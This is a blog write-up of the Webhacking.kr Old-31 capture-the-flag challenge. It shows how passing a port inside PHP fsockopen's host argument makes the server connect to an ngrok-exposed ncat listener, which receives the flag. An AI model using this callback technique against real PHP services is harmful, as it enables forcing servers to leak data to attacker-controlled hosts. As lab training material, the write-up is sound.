---
layout: post
title: "[Webhacking.kr] Old-31 writeup"
categories: hacking writeup web
---

# Introduction
Link: [https://webhacking.kr/challenge/web-16/](https://webhacking.kr/challenge/web-16/)

![p1](/assets/images/old-31/p1.png)

# Bypassing port randomization
The killing point of this challenge is the randomization of the port (10000 to 10100). After a little bit of google'ing around, I found that the `fsockopen` function would accept the designated port in the first argument. Read further here: [https://vigilance.fr/vulnerability/PHP-connection-to-another-port-via-fsockopen-22262](https://vigilance.fr/vulnerability/PHP-connection-to-another-port-via-fsockopen-22262)

Now we can specify the port we want, we want the app to connect to somewhere we have control of. If you don't have a public IP, you can expose your local address using a reverse proxy.

In my case I'm using ngrok to expose my local server.

```
PS C:\Users\l4rzy> ngrok tcp 1984
```
![ngrok](/assets/images/old-31/ngrok.png)

Of course I need to listen on that port on another terminal tab.
```
PS C:\Users\l4rzy> ncat -l 1984
```

And let's connect to that public address:

![p2](/assets/images/old-31/p2.png)

```
PS C:\Users\l4rzy> ncat -l 1984
GET /FLAG{i_have_a_big_and_beautiful_server} HTTP/1.0
Host: 0.tcp.ngrok.io:17945
```

# Conclusion
Easy!